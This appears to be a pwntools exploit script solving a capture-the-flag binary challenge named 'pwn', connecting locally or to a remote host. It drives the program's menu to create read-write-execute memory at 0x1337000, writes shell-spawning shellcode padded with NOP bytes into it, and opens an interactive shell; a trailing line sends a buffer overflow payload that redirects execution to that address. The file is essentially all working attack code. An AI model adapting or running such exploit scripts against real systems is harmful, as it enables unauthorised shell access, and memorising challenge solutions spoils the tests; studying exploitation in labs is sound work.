#!/usr/bin/env python3

from pwn import *
import os

exe = ELF("./pwn")

context.binary = exe
context.arch = "amd64"


if os.environ.get("ZELLIJ") == "0":
    context.terminal = [
        "zellij",
        "action",
        "new-pane",
        "-d",
        "right",
        "-c",
        "--",
        "bash",
        "-c",
    ]


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def dbg(cmd=""):
    if args.LOCAL:
        gdb.attach(r, cmd)
        pause()


def main():
    global r
    r = conn()
    r.sendlineafter("exit", b"1")
    r.sendlineafter("id: ", "1")
    r.sendlineafter("addr: ", str(0x1337000))
    r.sendlineafter("length: ", str(0x100))
    r.sendlineafter("mode: ", str(7))
    r.sendafter("note: ", asm(shellcraft.sh()).ljust(0x100, b"\x90"))
    r.interactive()
    r.sendline(b"a" * 8 + p64(0) + p64(0x1337000))

    # good luck pwning :)


if __name__ == "__main__":
    main()
